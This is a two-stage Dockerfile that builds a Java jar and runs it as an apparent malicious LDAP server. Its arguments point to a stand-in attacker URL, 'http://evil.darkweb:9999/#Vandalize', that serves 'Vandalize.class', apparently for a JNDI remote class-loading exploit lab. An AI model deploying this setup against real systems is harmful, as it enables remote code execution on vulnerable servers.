FROM maven:3-jdk-8-slim as build
COPY pom.xml pom.xml
COPY src src
RUN --mount=target=$HOME/.m2,type=cache mvn clean compile assembly:single

FROM openjdk:8 as ldap
COPY --from=build target/*.jar /server.jar
EXPOSE 8000
EXPOSE 9999

CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#Vandalize", "8000", "9999", "Vandalize.class"]

